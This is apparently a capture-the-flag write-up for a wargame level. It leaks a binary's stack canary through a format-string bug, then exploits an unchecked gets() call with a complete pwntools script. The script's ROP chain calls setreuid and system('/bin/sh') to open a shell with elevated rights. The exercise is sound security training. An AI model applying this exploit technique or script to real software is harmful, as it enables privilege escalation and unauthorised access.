## Infos on the binary

```shell
level10@rainfall:~$ checksec tessier
[*] '/home/level10/tessier'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

In `format_log()`, there is a fgets() reading 32 bytes into a 40 bytes buffer. Then it prints it, so we can use it to get the canary value.

The canary is the 11th argument :

```shell
level10@rainfall:~$ python3 -c 'import sys; sys.stdout.buffer.write(b"%11$p")' | ./tessier 
  [TESSIER-ASHPOOL SA] This system is beyond you.
  [T-A] Final authentication required.
[T-A] Session tag: [T-A] Tag accepted: 0xe7f49f816ec97400
```

```shell
level10@rainfall:~$ python3 -c 'import sys; sys.stdout.buffer.write(b"%p "*10)' | ./tessier 
  [TESSIER-ASHPOOL SA] This system is beyond you.
  [T-A] Final authentication required.
[T-A] Session tag: [T-A] Tag accepted: 0x7fffffffe070 (nil) (nil) (nil) (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x207025207025 (nil) 
[T-A] Authentication token: [T-A] Access denied. Session 0 terminated.
level10@rainfall:~$ python3 -c 'import sys; sys.stdout.buffer.write(b"%p "*11)' | ./tessier 
  [TESSIER-ASHPOOL SA] This system is beyond you.
  [T-A] Final authentication required.
[T-A] Session tag: [T-A] Tag accepted: 
[T-A] Authentication token: [T-A] Access denied. Session 0 terminated.
```

Then in `authenticate`, there is a call to gets() unprotected, writing into a 72 bytes buffer. It allows us to fill the buffer, put the canary value, overwrite the return address with a ROP chain to spawn a shell with the correct rights.

It is strictly the same as level09.

```python
from pwn import *

elf = context.binary = ELF('./tessier')
p = process('./tessier')

p.sendlineafter(b"[T-A] Session tag: ", b'%11$p')
p.recvuntil(b'[T-A] Tag accepted: ')
rep = p.recvline().strip()
canary = int(rep, 16)
print(hex(canary))

payload = b"A" * 72
payload += p64(canary)
payload += b"A" * 8
payload += p64(0x7ffff7d0c08d)   # pop rdi ; ret
payload += p64(1027)             # uid de flag10
payload += p64(0x7ffff7d10b7d)   # pop rsi ; ret
payload += p64(1027)             # uid de flag10
payload += p64(0x7ffff7d27370)   # setreuid
payload += p64(0x7ffff7d0c08d)   # pop rdi ; ret
payload += p64(0x7ffff7dcc42f)   # "/bin/sh"
payload += p64(0x7ffff7c58750)   # system
payload += b"\n"

p.sendafter(b"[T-A] Authentication token: ", payload)

p.interactive()
```